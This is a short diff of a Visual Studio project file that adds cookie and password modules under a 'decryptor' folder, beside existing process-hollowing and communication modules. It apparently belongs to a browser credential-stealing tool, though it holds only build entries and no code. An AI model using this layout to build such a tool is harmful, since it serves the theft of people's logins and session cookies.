@@ -137,6 +137,8 @@
     <ClCompile Include="src\comm\comm.cpp" />
     <ClCompile Include="src\dbg\dbg.cpp" />
     <ClCompile Include="src\decryptor\content\content.cpp" />
+    <ClCompile Include="src\decryptor\content\cookies.cpp" />
+    <ClCompile Include="src\decryptor\content\passwords.cpp" />
     <ClCompile Include="src\decryptor\decrypt\decrypt.cpp" />
     <ClCompile Include="src\hollowing\hollowing.cpp" />
     <ClCompile Include="src\utils\utils.cpp" />
@@ -147,6 +149,7 @@
     <ClInclude Include="src\config\config.h" />
     <ClInclude Include="src\dbg\dbg.h" />
     <ClInclude Include="src\decryptor\content\content.h" />
+    <ClInclude Include="src\decryptor\content\data\queries.h" />
     <ClInclude Include="src\decryptor\decrypt\decrypt.h" />
     <ClInclude Include="src\hollowing\hollowing.h" />
     <ClInclude Include="src\shared\ntapi.h" />
